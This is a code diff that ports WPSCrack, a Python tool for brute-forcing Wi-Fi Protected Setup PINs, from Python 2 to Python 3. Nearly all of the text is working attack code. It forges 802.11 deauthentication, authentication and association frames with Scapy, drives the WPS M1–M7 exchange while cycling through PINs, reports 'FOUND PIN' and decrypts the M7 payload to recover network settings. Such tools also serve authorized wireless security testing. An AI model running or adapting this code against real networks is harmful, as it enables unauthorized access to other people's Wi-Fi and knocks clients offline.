@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 '''
 This software was written by Stefan Viehboeck <sviehboeck@gmail.com>
 based on the Windows Connect Now - NET spec and code in wpa_supplicant.
@@ -136,11 +136,11 @@ class WPSCrack:
         sniffer_thread.start()
         time.sleep(1)
             
-        authorization_request = RadioTap() / Dot11(proto=0L, FCfield=0L, subtype=11L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0L) \
+        authorization_request = RadioTap() / Dot11(proto=0, FCfield=0, subtype=11, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0) \
         / Dot11Auth(status=0, seqnum=1, algo=0)
         
-        association_request = RadioTap() / Dot11(proto=0L, FCfield=0L, subtype=0L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0L) \
-        / Dot11AssoReq(listen_interval=5, cap=12548L) \
+        association_request = RadioTap() / Dot11(proto=0, FCfield=0, subtype=0, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0) \
+        / Dot11AssoReq(listen_interval=5, cap=12548) \
         / Dot11Elt(info=self.ssid, ID=0, len=len(self.ssid)) \
         / Dot11Elt(info='\x02\x04\x0b\x16\x0c\x12\x18$', ID=1, len=8) \
         / Dot11Elt(info='0H`l', ID=50, len=4) \
@@ -148,14 +148,14 @@ class WPSCrack:
         / Dot11Elt(info='\x00P\xf2\x04\x10J\x00\x01\x10\x10:\x00\x01\x02', ID=221, len=14)
         # TODO: add 802.11n capabilities 
         
-        eapol_start = RadioTap() / Dot11(proto=0L, FCfield=1L, subtype=8L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=2L, ID=0) \
-        / Dot11QoS(TID=0L, TXOP=0, Reserved=0L, EOSP=0L) \
+        eapol_start = RadioTap() / Dot11(proto=0, FCfield=1, subtype=8, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=2, ID=0) \
+        / Dot11QoS(TID=0, TXOP=0, Reserved=0, EOSP=0) \
         / LLC(dsap=170, ssap=170, ctrl=3) \
         / SNAP(OUI=0, code=34958) \
         / EAPOL(version=1, type=1, len=0)
         
-        response_identity = RadioTap() / Dot11(proto=0L, FCfield=1L, subtype=8L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=2L, ID=0) \
-        / Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) \
+        response_identity = RadioTap() / Dot11(proto=0, FCfield=1, subtype=8, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=2, ID=0) \
+        / Dot11QoS(TID=0, Reserved=0, TXOP=0, EOSP=0) \
         / LLC(dsap=170, ssap=170, ctrl=3) \
         / SNAP(OUI=0, code=34958) \
         / EAPOL(version=1, type=0, len=35) \
@@ -174,40 +174,40 @@ class WPSCrack:
             
             i += 1
             if self.verbose: 
-                print '------------------- attempt #%i' % i
+                print('------------------- attempt #%i' % i)
             self.timeout_timer = threading.Timer(self.timeout_time, self.timeout)
             self.timeout_timer.start()
             self.has_auth_failed = False
             self.has_timeout = False
             self.has_retry = False
             start_time = time.time()
-            print 'Trying', self.pin    
+            print('Trying', self.pin)
                 
             self.send_deauth()
                         
             if self.verbose: 
-                print '-> 802.11 authentication request'    
+                print('-> 802.11 authentication request')    
             self.rcved.clear()
             sendp(authorization_request, verbose=0)
             self.rcved.wait()
             
             if self.rcved_auth_response:
                 if self.verbose: 
-                    print '-> 802.11 association request'
+                    print('-> 802.11 association request')
                 self.rcved.clear()
                 sendp(association_request, verbose=0)
                 self.rcved.wait()
                                     
                 if self.rcved_asso_response:
                     if self.verbose: 
-                        print '-> EAPOL start'
+                        print('-> EAPOL start')
                     self.rcved.clear()
                     sendp(eapol_start, verbose=0)
                     self.rcved.wait()                        
                         
                     if self.rcved_eap_request_identity:
                         if self.verbose: 
-                            print '-> EAP response identity'
+                            print('-> EAP response identity')
                         response_identity[EAP].id = self.request_EAP_id
                         self.rcved.clear()
                         sendp(response_identity, verbose=0)
@@ -215,14 +215,14 @@ class WPSCrack:
                         
                         if self.rcved_m1:
                             if self.verbose: 
-                                print '-> M2'
+                                print('-> M2')
                             self.rcved.clear()
                             self.send_M2()
                             self.rcved.wait()
                             
                             if self.rcved_m3:
                                 if self.verbose: 
-                                    print '-> M4'
+                                    print('-> M4')
                                 self.rcved.clear()
                                 self.send_M4()
                                 self.m4_sent = True
@@ -230,7 +230,7 @@ class WPSCrack:
                                 
                                 if self.rcved_m5:
                                     if self.verbose: 
-                                        print '-> M6'
+                                        print('-> M6')
                                     self.rcved.clear()
                                     self.send_M6()
                                     self.rcved.wait()
@@ -240,7 +240,7 @@ class WPSCrack:
             self.rcved.clear()
             self.timeout_timer.cancel()
             if self.verbose: 
-                print 'attempt took %.3f seconds' % (time.time() - start_time)
+                print('attempt took %.3f seconds' % (time.time() - start_time))
             self.gen_pin()
     
     def bignum_pack(self, n, l):
@@ -306,7 +306,7 @@ class WPSCrack:
 
     def send_M2(self):
         if self.ENonce == '':
-            print 'enonce is empty!!!'
+            print('enonce is empty!!!')
         
         m2 = [
         [0xFF00, '\x00\x37\x2A'],
@@ -342,8 +342,8 @@ class WPSCrack:
         ] 
         
         eap_expanded = self.assemble_EAP_Expanded(m2)
-        m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
-        / Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) / LLC(dsap=170, ssap=170, ctrl=3) \
+        m = RadioTap() / Dot11(proto=0, FCfield=1, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8, SC=80, type=2, ID=55808) \
+        / Dot11QoS(TID=0, Reserved=0, TXOP=0, EOSP=0) / LLC(dsap=170, ssap=170, ctrl=3) \
         / SNAP(OUI=0, code=34958) \
         / EAPOL(version=1, type=0, len=383) \
         / EAP(code=2, type=254, id=self.request_EAP_id, len=383) \
@@ -375,8 +375,8 @@ class WPSCrack:
         ]
         
         eap_expanded = self.assemble_EAP_Expanded(m4)
-        m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
-        / Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) \
+        m = RadioTap() / Dot11(proto=0, FCfield=1, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8, SC=80, type=2, ID=55808) \
+        / Dot11QoS(TID=0, Reserved=0, TXOP=0, EOSP=0) \
         / LLC(dsap=170, ssap=170, ctrl=3) \
         / SNAP(OUI=0, code=34958) \
         / EAPOL(version=1, type=0, len=196) \
@@ -405,8 +405,8 @@ class WPSCrack:
         ]
         
         eap_expanded = self.assemble_EAP_Expanded(m6)
-        m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
-        / Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) / LLC(dsap=170, ssap=170, ctrl=3) \
+        m = RadioTap() / Dot11(proto=0, FCfield=1, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8, SC=80, type=2, ID=55808) \
+        / Dot11QoS(TID=0, Reserved=0, TXOP=0, EOSP=0) / LLC(dsap=170, ssap=170, ctrl=3) \
         / SNAP(OUI=0, code=34958) / EAPOL(version=1, type=0, len=124) \
         / EAP(code=2, type=254, id=self.request_EAP_id, len=124) / Raw(load=eap_expanded)
         authenticator = self.gen_authenticator(str(m[Raw])[9:])
@@ -424,9 +424,9 @@ class WPSCrack:
         if 0x1022 in d:
             if ord(d[0x1022]) in self.wps_message_types:
                 message_type = self.wps_message_types[ord(d[0x1022])]
-                if self.verbose: print '<-', message_type
+                if self.verbose: print('<-', message_type)
             else:
-                print '< unknown Message Type: 0x%X', ord(d[0x1022])
+                print('< unknown Message Type: 0x%X', ord(d[0x1022]))
             if message_type == 'M1':
                 self.ENonce = d[0x101a]
                 self.PK_E = d[0x1032]            
@@ -440,12 +440,12 @@ class WPSCrack:
             elif message_type == 'M5':
                 # we could validate the data but it makes no sense
                 if not self.got_fist_half:
-                    print 'found first half:', self.pin[0:4]
+                    print('found first half:', self.pin[0:4])
                 self.got_fist_half = True
                 self.rcved_m5 = True
             elif message_type == 'M7':
                 # juice
-                print '-------------------------- FOUND PIN: %s --------------------------' % self.pin
+                print('-------------------------- FOUND PIN: %s --------------------------' % self.pin)
                 encrypted = d[0x1018]
                 x = self.decrypt(encrypted[:16], encrypted[16:])
                 self.dump_EAP_Expanded(x)
@@ -467,17 +467,17 @@ class WPSCrack:
                     ]
                     
                     eap_expanded = self.assemble_EAP_Expanded(nack)
-                    m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
-                    / Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) / LLC(dsap=170, ssap=170, ctrl=3) \
+                    m = RadioTap() / Dot11(proto=0, FCfield=1, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8, SC=80, type=2, ID=55808) \
+                    / Dot11QoS(TID=0, Reserved=0, TXOP=0, EOSP=0) / LLC(dsap=170, ssap=170, ctrl=3) \
                     / SNAP(OUI=0, code=34958) \
                     / EAPOL(version=1, type=0, len=70) \
                     / EAP(code=2, type=254, id=self.request_EAP_id, len=70) \
                     / Raw(load=eap_expanded)
                     if self.verbose: 
-                        print '-> WCS_NACK'
+                        print('-> WCS_NACK')
                     sendp(m, verbose=0)
                 else:
-                    print 'got NACK before M4 - something is wrong'
+                    print('got NACK before M4 - something is wrong')
                     self.has_retry = True
             return
                 
@@ -489,12 +489,12 @@ class WPSCrack:
 
                 if x.haslayer(Dot11Auth) and not x[Dot11Auth].status:
                     if self.verbose: 
-                        print '<- 802.11 authentication response'
+                        print('<- 802.11 authentication response')
                     self.rcved_auth_response = True
                     self.rcved.set()
                 elif x.haslayer(Dot11AssoResp) and not x[Dot11AssoResp].status:
                     if self.verbose: 
-                        print '<- 802.11 association response'
+                        print('<- 802.11 association response')
                     self.rcved_asso_response = True
                     self.rcved.set()
                 elif x.haslayer(EAP) and x[EAP].code == 1:
@@ -507,13 +507,13 @@ class WPSCrack:
                         self.rcved.set()
                     elif x[EAP].type == 1:
                         if self.verbose: 
-                            print '<- EAP request identity'
+                            print('<- EAP request identity')
                         if not self.rcved_eap_request_identity:
                             self.rcved_eap_request_identity = True
                             self.rcved.set()
                     else:
-                        print 'got unknown EAP message:'
-                        print x.command()
+                        print('got unknown EAP message:')
+                        print(x.command())
                         
             return False
         else:
@@ -521,13 +521,13 @@ class WPSCrack:
             return False
     
     def sniffer(self):
-        print 'sniffer started'
+        print('sniffer started')
         sniff(store=0, stop_filter=lambda x: self.sniffer_filter(x))
-        print 'sniffer stopped'
+        print('sniffer stopped')
         sys.exit()
     
     def timeout(self):
-        print 'TIMEOUT!!'
+        print('TIMEOUT!!')
         self.rcved.set()
         self.has_timeout = True
         
@@ -556,8 +556,8 @@ class WPSCrack:
         
     def send_deauth(self):
         if self.verbose: 
-            print '-> 802.11 deauthentication'
-        deauth = RadioTap() / Dot11(proto=0L, FCfield=0L, subtype=12L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0L, ID=0) \
+            print('-> 802.11 deauthentication')
+        deauth = RadioTap() / Dot11(proto=0, FCfield=0, subtype=12, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0, ID=0) \
         / Dot11Deauth(reason=1)
         sendp(deauth, verbose=0)
                
@@ -593,11 +593,11 @@ class WPSCrack:
     def dump_EAP_Expanded(self, lst):
         for e in lst:
             if e[0] in self.wps_attributes:
-                print self.wps_attributes[e[0]], ':'
+                print(self.wps_attributes[e[0]], ':')
                 hexdump(e[1])
             else:
-                print 'Message ID 0x%X not found!' % e[0]
-                print e
+                print('Message ID 0x%X not found!' % e[0])
+                print(e)
     
     def abort(self, *args, **kwargs):
         self.done = True
@@ -651,7 +651,7 @@ def main():
         
         wps.run()
     else:
-        print 'check arguments or use --help!'
+        print('check arguments or use --help!')
     return
 
 if __name__ == '__main__':
